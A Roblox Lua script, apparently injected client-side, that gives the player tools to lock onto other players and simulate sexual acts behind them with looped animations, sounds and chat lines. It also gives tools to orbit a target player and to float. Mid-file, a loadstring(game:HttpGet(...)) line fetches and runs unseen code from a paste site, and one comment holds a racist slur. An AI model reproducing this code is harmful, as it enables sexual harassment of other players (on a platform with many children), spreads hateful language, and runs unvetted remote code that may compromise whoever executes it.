-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local ChatService = game:GetService("Chat")  -- used to display chat bubbles

local player = Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")

-----------------------------------------------------------
-- Function: startBang
-- Description:
--   1. The flight phase lasts 6 seconds. During this phase, your character
--      slowly ascends (float speed = 0.5 studs/sec) while spinning.
--      At 5 seconds, it displays one chat message (depending on the tool used).
--      When flight ends, it displays the second chat message.
--   2. Then, an animation (ID 148840371) is played at speed 4.
--   3. While the animation plays, your character continuously tweens between two
--      positions behind the target (keeping close and matching their rotation).
--   4. In addition, if your character’s HumanoidRootPart touches the target’s
--      HumanoidRootPart, a “bang” sound is played.
--
-- Parameters:
--   targetPlayer (Player): The target to follow.
--   tool (Tool): The tool used, which determines which chat messages are shown.
-----------------------------------------------------------
local function startBang(targetPlayer, tool)
    local character = player.Character
    if not character then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local hrp = character:FindFirstChild("HumanoidRootPart")
    local head = character:FindFirstChild("Head")
    if not (humanoid and hrp and head) then return end

    local equipped = true
    local chat1Played = false
    local animTrack = nil

    -- Select chat messages based on the tool.
    local chatMsg1, chatMsg2
    if tool.Name == "Select Bang" then
        chatMsg1 = "Calculating every path to the target..."
        chatMsg2 = "Found target! Preparing to Get Freaky.."
    else  -- default to Random bang messages
        chatMsg1 = "Hold on tight folks! Calculating every player in the server"
        chatMsg2 = "Target found! Eureka! Eureka! Three two one..."
    end

    -- A sound to simulate a "bang" effect.
    local bangSound = Instance.new("Sound")
    bangSound.SoundId = "rbxassetid://13114759"  -- Replace with your preferred bang sound ID.
    bangSound.Volume = 1
    bangSound.Parent = hrp

    -- When the tool is unequipped, stop everything.
    local unequipConn = tool.Unequipped:Connect(function()
        equipped = false
        if animTrack then animTrack:Stop() end
        unequipConn:Disconnect()
    end)

    -- Connect a Touched event on our HRP so that if we “collide” with the target,
    -- we play the bang sound.
    local touchConn
    touchConn = hrp.Touched:Connect(function(hit)
        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local targetHRP = targetPlayer.Character.HumanoidRootPart
            if hit == targetHRP then
                bangSound:Play()
            end
        end
    end)

    -- Flight phase (6 seconds)
    local bodyGyro = Instance.new("BodyGyro", hrp)
    bodyGyro.MaxTorque = Vector3.new(400000,400000,400000)
    bodyGyro.P = 10000

    local bodyVelocity = Instance.new("BodyVelocity", hrp)
    bodyVelocity.MaxForce = Vector3.new(400000,400000,400000)
    local flightVelocity = 1.2  -- slower upward float speed (studs/sec)
    local spinSpeed = math.rad(30)
    local startTime = tick()

    while tick() - startTime < 6 and equipped do
        bodyGyro.CFrame = hrp.CFrame * CFrame.Angles(0, spinSpeed, 0)
        bodyVelocity.Velocity = Vector3.new(0, flightVelocity, 0)
        if tick() - startTime >= 5 and not chat1Played then
            ChatService:Chat(head, chatMsg1, Enum.ChatColor.White)
            chat1Played = true
        end
        RunService.Heartbeat:Wait()
    end
    bodyGyro:Destroy()
    bodyVelocity:Destroy()

    if not equipped then
        if touchConn then touchConn:Disconnect() end
        return 
    end

    ChatService:Chat(head, chatMsg2, Enum.ChatColor.White)

    -- Play the animation at speed 4.
    local animation = Instance.new("Animation")
    animation.AnimationId = "rbxassetid://148840371"
    animTrack = humanoid:LoadAnimation(animation)
    animTrack.Looped = true
    animTrack:Play()
    animTrack:AdjustSpeed(4)

    -- Continuously tween behind the target.
    local behindDistance = 2  -- studs behind target
    local forwardDistance = 1 -- a bit closer than behindDistance
    local tweenDuration = 0.3

    while equipped do
        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local targetHRP = targetPlayer.Character.HumanoidRootPart
            local targetPos = targetHRP.Position
            local targetLookVector = targetHRP.CFrame.LookVector

            local behindPos = targetPos - targetLookVector * behindDistance
            local behindCFrame = CFrame.new(behindPos, behindPos + targetLookVector)
            local forwardPos = targetPos - targetLookVector * forwardDistance
            local forwardCFrame = CFrame.new(forwardPos, forwardPos + targetLookVector)

            local tweenInfo = TweenInfo.new(tweenDuration, Enum.EasingStyle.Linear)
            local tween1 = TweenService:Create(hrp, tweenInfo, {CFrame = behindCFrame})
            tween1:Play()
            tween1.Completed:Wait()
            if not equipped then break end
            local tween2 = TweenService:Create(hrp, tweenInfo, {CFrame = forwardCFrame})
            tween2:Play()
            tween2.Completed:Wait()
        else
            wait(0.3)
        end
    end

    if touchConn then touchConn:Disconnect() end
end

-----------------------------------------------------------
-- Tool 1: "Random bang"
-- Description:
--  When equipped, this tool automatically selects a random target
--  (other than yourself) and calls startBang on that target.
-----------------------------------------------------------
local randomBangTool = Instance.new("Tool")
randomBangTool.Name = "رحمه عشوائي"
randomBangTool.RequiresHandle = false
randomBangTool.Parent = backpack

randomBangTool.Equipped:Connect(function()
    -- Gather valid target players.
    local validTargets = {}
    for _, other in pairs(Players:GetPlayers()) do
        if other ~= player and other.Character and other.Character:FindFirstChild("HumanoidRootPart") then
            table.insert(validTargets, other)
        end
    end
    if #validTargets == 0 then
        warn("No valid targets found.")
        return
    end
    local targetPlayer = validTargets[math.random(1, #validTargets)]
    startBang(targetPlayer, randomBangTool)
end)

-----------------------------------------------------------
-- Tool 2: "Select Bang"
-- Description:
--  When equipped, this tool waits for you to click on a player's character.
--  When you click a valid target, it calls startBang on that target.
-----------------------------------------------------------
local selectBangTool = Instance.new("Tool")
selectBangTool.Name = "رحمه اضغط على الشخص الي تبيه"
selectBangTool.RequiresHandle = false
selectBangTool.Parent = backpack

selectBangTool.Equipped:Connect(function()
    local mouse = player:GetMouse()
    local targetSelected = false
    local clickConn
    clickConn = mouse.Button1Down:Connect(function()
        if targetSelected then return end
        local targetPart = mouse.Target
        if targetPart then
            local targetCharacter = targetPart:FindFirstAncestorOfClass("Model")
            if targetCharacter and targetCharacter:FindFirstChild("Humanoid") and targetCharacter:FindFirstChild("HumanoidRootPart") then
                targetSelected = true
                clickConn:Disconnect()
                local targetPlayer = Players:GetPlayerFromCharacter(targetCharacter)
                if targetPlayer then
                    startBang(targetPlayer, selectBangTool)
-- I hate niggers so much fuck you
                end
            end
        end
    end)
end)

loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))("Spider Script")

-----------------------------
-- Services and Variables  --
-----------------------------
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local Backpack = LocalPlayer:WaitForChild("Backpack")

local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local HRP = Character:WaitForChild("HumanoidRootPart")
local Humanoid = Character:WaitForChild("Humanoid")

-------------------------------------------------
-- [1] STARE TOOL & UI (Orbiting a target)   --
-------------------------------------------------
-- Default orbit parameters
local orbitSpeed = 1      -- Default orbit speed (min: 0)
local orbitRadius = 6     -- Default orbit radius (min: 2.5) – adjusted by 0.1 increments
local orbitHeight = 4     -- Default orbit height (min: 2)

-- UI Setup (visible only when holding Stare)
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = PlayerGui
screenGui.Enabled = false  -- Only visible when holding the tool

-- Container frame anchored to the top-right
local controlFrame = Instance.new("Frame")
controlFrame.Size = UDim2.new(0, 200, 0, 210)
controlFrame.AnchorPoint = Vector2.new(1, 0)
controlFrame.Position = UDim2.new(1, -10, 0, 10)
controlFrame.BackgroundTransparency = 1
controlFrame.Parent = screenGui

-- Helper to create a parameter group (label and two side‐by‐side buttons)
local function createParamGroup(parent, yPos, paramName, initialValue)
    local label = Instance.new("TextLabel")
    label.Name = paramName .. "Label"
    label.Size = UDim2.new(0, 200, 0, 30)
    label.Position = UDim2.new(0, 0, 0, yPos)
    label.Text = paramName .. ": " .. tostring(initialValue)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.new(1, 1, 1)
    label.TextScaled = true
    label.Parent = parent

    local btnFrame = Instance.new("Frame")
    btnFrame.Name = paramName .. "Buttons"
    btnFrame.Size = UDim2.new(0, 200, 0, 30)
    btnFrame.Position = UDim2.new(0, 0, 0, yPos + 30)
    btnFrame.BackgroundTransparency = 1
    btnFrame.Parent = parent

    local minusBtn = Instance.new("TextButton")
    minusBtn.Name = paramName .. "Minus"
    minusBtn.Size = UDim2.new(0.5, 0, 1, 0)
    minusBtn.Position = UDim2.new(0, 0, 0, 0)
    minusBtn.Text = "-"
    minusBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    minusBtn.TextColor3 = Color3.new(1, 1, 1)
    minusBtn.TextScaled = true
    minusBtn.Parent = btnFrame

    local plusBtn = Instance.new("TextButton")
    plusBtn.Name = paramName .. "Plus"
    plusBtn.Size = UDim2.new(0.5, 0, 1, 0)
    plusBtn.Position = UDim2.new(0.5, 0, 0, 0)
    plusBtn.Text = "+"
    plusBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    plusBtn.TextColor3 = Color3.new(1, 1, 1)
    plusBtn.TextScaled = true
    plusBtn.Parent = btnFrame

    return {
        label = label,
        minus = minusBtn,
        plus = plusBtn,
    }
end

-- Create parameter groups for Speed, Radius, and Height.
local speedGroup = createParamGroup(controlFrame, 0, "Speed", orbitSpeed)
local radiusGroup = createParamGroup(controlFrame, 70, "Radius", orbitRadius)
local heightGroup = createParamGroup(controlFrame, 140, "Height", orbitHeight)

-- Speed button logic (increments of 1, min 0)
speedGroup.plus.MouseButton1Click:Connect(function()
    orbitSpeed = orbitSpeed + 1
    speedGroup.label.Text = "Speed: " .. tostring(orbitSpeed)
end)
speedGroup.minus.MouseButton1Click:Connect(function()
    orbitSpeed = math.max(0, orbitSpeed - 1)
    speedGroup.label.Text = "Speed: " .. tostring(orbitSpeed)
end)

-- Radius button logic (increments of 0.1, min 2.5)
radiusGroup.plus.MouseButton1Click:Connect(function()
    orbitRadius = orbitRadius + 0.1
    radiusGroup.label.Text = "Radius: " .. string.format("%.1f", orbitRadius)
end)
radiusGroup.minus.MouseButton1Click:Connect(function()
    orbitRadius = math.max(2.5, orbitRadius - 0.1)
    radiusGroup.label.Text = "Radius: " .. string.format("%.1f", orbitRadius)
end)

-- Height button logic (increments of 1, min 2)
heightGroup.plus.MouseButton1Click:Connect(function()
    orbitHeight = orbitHeight + 1
    heightGroup.label.Text = "Height: " .. tostring(orbitHeight)
end)
heightGroup.minus.MouseButton1Click:Connect(function()
    orbitHeight = math.max(2, orbitHeight - 1)
    heightGroup.label.Text = "Height: " .. tostring(orbitHeight)
end)

-- Create the Stare tool
local stareTool = Instance.new("Tool")
stareTool.Name = "تجسس"
stareTool.RequiresHandle = false
stareTool.Parent = Backpack

local stareOrbiting = false
local stareConn, stareClickConn
local stareBP, stareBG

stareTool.Equipped:Connect(function(mouse)
    screenGui.Enabled = true  -- Show the UI when holding Stare
    stareClickConn = mouse.Button1Down:Connect(function()
        if stareOrbiting then return end
        local targetPart = mouse.Target
        if targetPart then
            local targetChar = targetPart:FindFirstAncestorOfClass("Model")
            local targetPlayer = targetChar and Players:GetPlayerFromCharacter(targetChar)
            if targetPlayer and targetPlayer ~= LocalPlayer then
                local targetHRP = targetChar:FindFirstChild("HumanoidRootPart") or targetChar:FindFirstChild("Torso")
                if targetHRP then
                    stareOrbiting = true
                    Humanoid.PlatformStand = true

                    stareBP = Instance.new("BodyPosition")
                    stareBP.MaxForce = Vector3.new(1e5, 1e5, 1e5)
                    stareBP.P = 1e4
                    stareBP.D = 100
                    stareBP.Parent = HRP

                    stareBG = Instance.new("BodyGyro")
                    stareBG.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
                    stareBG.P = 1e4
                    stareBG.D = 100
                    stareBG.Parent = HRP

                    local angle = 0
                    stareConn = RunService.RenderStepped:Connect(function(dt)
                        if not (targetHRP and targetHRP.Parent) then
                            stareConn:Disconnect()
                            stareOrbiting = false
                            if stareBP then stareBP:Destroy() stareBP = nil end
                            if stareBG then stareBG:Destroy() stareBG = nil end
                            return
                        end

                        angle = angle + (orbitSpeed * dt)
                        local targetPos = targetHRP.Position
                        local desiredPos = targetPos + Vector3.new(orbitRadius * math.cos(angle), orbitHeight, orbitRadius * math.sin(angle))
                        stareBP.Position = desiredPos

                        local direction = targetPos - desiredPos
                        local horizontalDir = Vector3.new(direction.X, 0, direction.Z)
                        if horizontalDir.Magnitude < 0.001 then
                            horizontalDir = Vector3.new(0, 0, -1)
                        else
                            horizontalDir = horizontalDir.Unit
                        end
                        local baseCFrame = CFrame.new(desiredPos, desiredPos + horizontalDir)
                        local downwardTilt = CFrame.Angles(math.rad(-45), 0, 0)
                        stareBG.CFrame = baseCFrame * downwardTilt
                    end)
                end
            end
        end
    end)
end)

stareTool.Unequipped:Connect(function()
    screenGui.Enabled = false  -- Hide UI when tool is unequipped
    if stareClickConn then
        stareClickConn:Disconnect()
        stareClickConn = nil
    end
    if stareConn then
        stareConn:Disconnect()
        stareConn = nil
    end
    if stareBP then
        stareBP:Destroy()
        stareBP = nil
    end
    if stareBG then
        stareBG:Destroy()
        stareBG = nil
    end
    stareOrbiting = false
    Humanoid.PlatformStand = false
    HRP.Velocity = Vector3.new(0, 0, 0)
    HRP.RotVelocity = Vector3.new(0, 0, 0)
end)

-------------------------------------------------
-- [2] BANG TOOL (Teleport behind target)     --
-------------------------------------------------
local bangTool = Instance.new("Tool")
bangTool.Name = "رحمه"
bangTool.ToolTip = "Winter arc of palace fr"
bangTool.RequiresHandle = false
bangTool.Parent = Backpack

local bangOrbiting = false
local bangConn, bangBP, bangBG, bangClickConn
local bangTime = 0
local distanceBehind = 1.2  -- Distance behind target is now 1.2 studs

bangTool.Equipped:Connect(function(mouse)
    -- Enable PlatformStand for Bang tool
    Humanoid.PlatformStand = true
    bangClickConn = mouse.Button1Down:Connect(function()
        if bangOrbiting then return end
        local targetPart = mouse.Target
        if targetPart then
            local targetChar = targetPart:FindFirstAncestorOfClass("Model")
            local targetPlayer = targetChar and Players:GetPlayerFromCharacter(targetChar)
            if targetPlayer and targetPlayer ~= LocalPlayer then
                local targetHRP = targetChar:FindFirstChild("HumanoidRootPart") or targetChar:FindFirstChild("Torso")
                if targetHRP then
                    bangOrbiting = true
                    bangTime = 0

                    bangBP = Instance.new("BodyPosition")
                    bangBP.MaxForce = Vector3.new(1e5, 1e5, 1e5)
                    bangBP.P = 1e4
                    bangBP.D = 100
                    bangBP.Parent = HRP

                    bangBG = Instance.new("BodyGyro")
                    bangBG.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
                    bangBG.P = 1e4
                    bangBG.D = 100
                    bangBG.Parent = HRP

                    bangConn = RunService.RenderStepped:Connect(function(dt)
                        if not (targetHRP and targetHRP.Parent) then
                            bangConn:Disconnect()
                            bangOrbiting = false
                            if bangBP then bangBP:Destroy() bangBP = nil end
                            if bangBG then bangBG:Destroy() bangBG = nil end
                            return
                        end

                        bangTime = bangTime + dt
                        local targetPos = targetHRP.Position
                        local targetLook = targetHRP.CFrame.LookVector
                        local desiredPos = targetPos - (targetLook * distanceBehind)
                        bangBP.Position = desiredPos

                        -- More intense oscillation: frequency increased to 8 and amplitude increased to 40°.
                        local frequency = 8
                        local amplitude = math.rad(40)
                        local pitchOsc = math.sin(bangTime * frequency) * amplitude
                        local baseCFrame = CFrame.new(desiredPos, desiredPos + targetLook)
                        bangBG.CFrame = baseCFrame * CFrame.Angles(pitchOsc, 0, 0)
                    end)
                end
            end
        end
    end)
end)

bangTool.Unequipped:Connect(function()
    if bangClickConn then
        bangClickConn:Disconnect()
        bangClickConn = nil
    end
    if bangConn then
        bangConn:Disconnect()
        bangConn = nil
    end
    if bangBP then
        bangBP:Destroy()
        bangBP = nil
    end
    if bangBG then
        bangBG:Destroy()
        bangBG = nil
    end
    bangOrbiting = false
    Humanoid.PlatformStand = false
    HRP.Velocity = Vector3.new(0, 0, 0)
    HRP.RotVelocity = Vector3.new(0, 0, 0)
end)

-------------------------------------------------
-- [3] FLOAT TOOL (Bob up/down & tilt)          --
-------------------------------------------------
local floatTool = Instance.new("Tool")
floatTool.Name = "يطفو"
floatTool.ToolTip = "Makes you float and tilt while you walk."
floatTool.RequiresHandle = false
floatTool.Parent = Backpack

local floatConn, floatBP, floatBG
local baseY = 0
local floatStartTime = 0

floatTool.Equipped:Connect(function(mouse)
    -- Float tool does not force PlatformStand, so movement remains normal.
    baseY = HRP.Position.Y
    floatStartTime = tick()
    
    floatBP = Instance.new("BodyPosition")
    floatBP.MaxForce = Vector3.new(0, 1e5, 0)
    floatBP.P = 1e4
    floatBP.D = 100
    floatBP.Parent = HRP
    
    floatBG = Instance.new("BodyGyro")
    floatBG.MaxTorque = Vector3.new(0, 0, 1e5)
    floatBG.P = 1e4
    floatBG.D = 100
    floatBG.Parent = HRP
    
    floatConn = RunService.RenderStepped:Connect(function(dt)
        local t = tick() - floatStartTime
        local offsetY = math.sin(t * 1) * 2  -- Vertical bobbing
        floatBP.Position = Vector3.new(HRP.Position.X, baseY + offsetY, HRP.Position.Z)
        
        local rollOsc = math.sin(t * 1) * math.rad(10)  -- Tilt (roll) oscillation
        local _, currentYaw, _ = HRP.CFrame:ToEulerAnglesYXZ()
        floatBG.CFrame = CFrame.Angles(0, currentYaw, rollOsc)
    end)
end)

floatTool.Unequipped:Connect(function()
    if floatConn then
        floatConn:Disconnect()
        floatConn = nil
    end
    if floatBP then
        floatBP:Destroy()
        floatBP = nil
    end
    if floatBG then
        floatBG:Destroy()
        floatBG = nil
    end
    HRP.Velocity = Vector3.new(0, 0, 0)
    HRP.RotVelocity = Vector3.new(0, 0, 0)
end)
